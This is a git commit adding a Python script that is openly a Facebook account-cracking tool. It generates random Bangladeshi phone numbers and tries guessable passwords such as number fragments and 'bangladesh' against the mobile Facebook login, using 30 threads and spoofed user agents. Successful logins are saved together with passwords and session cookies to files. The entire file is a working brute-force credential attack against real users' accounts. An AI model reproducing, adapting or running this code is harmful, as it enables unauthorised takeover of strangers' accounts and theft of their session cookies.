345391c09128fdb95325e71947dc84734a554757
Hasa N <112847065+KgHasan@users.noreply.github.com>
2023-04-03 06:21:30 +0600

    Create Gift_Hasan.py

---
+++ Sc_Make_Hasan/Gift_Hasan.py
@@ -0,0 +1,214 @@
+#Sc Make By Asraful Islam Hasan
+#Sc Gift By Hasan
+
+#___________Impoet Module____________
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
+#________________Step 2______________
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+#_______________Coler Code_____________
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+#____________Timedate_____________
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+#_____________Proxy______________
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+    
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        
+logo = ("""\033[1;37m
+
+
+ db   db  .d8b.  .d8888.  .d8b.  d8b   db 
+ 88   88 d8' `8b 88'  YP d8' `8b 888o  88 
+ 88ooo88 88ooo88 `8bo.   88ooo88 88V8o 88 
+ 88~~~88 88~~~88   `Y8b. 88~~~88 88 V8o88 
+ 88   88 88   88 db   8D 88   88 88  V888 
+ YP   YP YP   YP `8888Y' YP   YP VP   V8P 
+                                         
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                     
+  Tools Create By Asraful islam Hasan
+  My Github Account KgHasan
+  My Fb Group Hasan Termux Helping Zone                                                                                      
+  My Id Name Hasa N
+  Tools Status Random
+  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+""")
+ 
+def naima():
+	print('-------------------')
+#_____________Def Main______________ 
+def Main():
+        os.system("clear")
+        print(logo)
+        print(" [1] RANDOM CRACK")
+        print(" [0] Exit")
+        Sumaiya =input("\n [?] Choose : ")
+        if Sumaiya in ["1","01"]:
+            fuck()
+        if Sumaiya in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+#______________Def Sc__________            
+def fuck():
+    user=[]
+    os.system('clear')
+    print(logo)
+    print('[×] Exm: 019, 016, 017, 018, 014, 014')
+    code = input('[?] Choice Your Code : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print('[×] Exm: 2000 3000 5000 10000 ')
+    limit = int(input('[?] Choice Your Liimit : '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as asha:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print('[×] Total ids: '+tl)
+        print("[×] Your Code: "+code)
+        print('[×] Airplne Moode On/Off')
+        print('[×] Process has been started')
+        print('-------------------')
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
+            asha.submit(hasan,uid,pwx,tl)
+    print('-------------------')
+    print(' [✓] Crack process has been completed')
+    print(' [✓] OK Ids saved as Hasan-OK.txt')
+    print(' [✓] CP Id Save as Hasan-CP.txt')
+    print('-------------------')
+def hasan(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r[HASAN]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            #_____Mathoid______#
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5541.214 Safari/537.36', }
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"[HASAN-OK] {uid}|{ps} \nCookie : {coki}")
+                open('/sdcard/Hasan-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"[HASAN-CP] {cid}|{ps}")
+                open('/sdcard/Hasan-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+        
+Main()
